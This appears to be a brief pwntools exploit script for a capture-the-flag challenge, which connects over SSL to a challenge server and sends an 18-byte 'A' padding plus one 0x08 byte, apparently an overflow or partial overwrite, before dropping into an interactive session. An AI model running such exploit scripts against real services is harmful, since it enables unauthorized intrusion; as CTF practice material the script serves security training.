#!/usr/bin/python3

from pwn import *

p = remote('blackhat2-49be4a5b3741eb6f530edd9f232145c2-0.chals.bh.ctf.sa', 443, ssl=True, sni='blackhat2-49be4a5b3741eb6f530edd9f232145c2-0.chals.bh.ctf.sa')



def exp():
	p.send("A"*18+'\x08')
	p.interactive()


if __name__ == '__main__':
	exp()
